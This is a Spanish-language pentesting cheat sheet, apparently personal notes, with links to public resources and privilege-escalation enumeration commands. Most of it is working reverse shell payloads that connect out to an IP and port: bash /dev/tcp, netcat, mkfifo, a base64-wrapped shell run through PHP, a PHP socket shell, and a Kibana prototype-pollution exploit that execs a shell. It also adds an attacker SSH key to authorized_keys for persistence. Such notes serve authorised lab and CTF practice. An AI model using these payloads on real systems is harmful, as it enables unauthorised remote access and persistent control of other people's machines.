# Pentesting

###### tags: `Info`
________________________

### Tutoriales y guías

- [Pentesting Cheat Sheet](https://book.hacktricks.xyz/)
- [Reverse shell – Cheat Sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/)
- [Reverse shell – Cheat Sheet 2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Guía Escalada Privilegios](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4)
- [Script enumeración en Linux](https://github.com/rebootuser/LinEnum)
- [Cheat Sheet - Escalada de Privilegios con comandos](https://gtfobins.github.io/)
- [Cheat Sheet - Escalada de Privilegios con capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

    - **cap_setuid**: permite que ese script cambie el Effective UID de quién lo ejecuta. Con eso, podemos simular lo que hace el SUID, es decir, hacer que el Effective UID sea 0 (root).


________________________

### Exploits

________________________

### Comandos

- Buscar puntos de EdP
    - <code>find / -user root -perm -4000 2>/dev/null</code>
    - <code>sudo -l</code>

_________________________

### Shell reversas

- PHP

    - Socket
        
            
            
    - System

        - ***B64SHELL*** --> <code>echo -n "/bin/bash -l > /dev/tcp/IP/PORT 0<&1 2>&1" | base64</code>
    
        ![](https://i.imgur.com/l3NyhIx.png)
        
            <?php 
                system('echo B64_SHELL | base64 -d | bash'); 
            ?>

- Bash

    - **TCP**: <code>/bin/bash -l > /dev/tcp/IP/PORT 0<&1 2>&1</code>
    - **NC**: <code>nc -e /bin/bash IP PORT</code>
    - **MKFIFO**: <code>rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT > /tmp/f</code>
    - **B64SHELL**: <code>echo -n "/bin/bash -l > /dev/tcp/IP/PORT 0<&1 2>&1" | base64</code>
    
        ![](https://i.imgur.com/l3NyhIx.png)
    
        <code>echo B64_SHELL | base64 -d | bash</code>
        
        ```php=
        <?php
            $ip="IP";
            $port=PORT;
            echo "Getting reverse shell on $ip:$port";
            $sock = fsockopen($ip,$port);
            $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
        ?>
        ```
    
- Kibana/Elastic
     <code>.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/IP/PORT 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')</code>

________________________

### Shell interactiva

- Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa:

    ```bash=
    python -c 'import pty; pty.spawn("/bin/bash")'
    script /dev/null -c bash
    CTRL + Z
    stty raw -echo
    fg
    reset
    xterm
    export TERM=xterm
    export SHELL=bash
    stty -a
    stty rows *NumRows* columns *NumCols*
    ```
    
    
    1. 
        
- Si tenemos acceso a la máquina con un usuario (no www-data) a través de una Shell reversa (no por SSH) y además, está levantado el SSH, podemos hacer lo siguiente, ya que no siempre funciona la Shell interactiva anterior.
    
    - ON MACHINE:

        <code>cd; mkdir -p ~/.ssh; echo "[MY LOCAL ~/.ssh/id_rsa.pub]" >> ~/.ssh/authorized_keys</code>

    - ON KALI:
    
        <code>ssh -i ~/.ssh/id_rsa USER@IP</code>
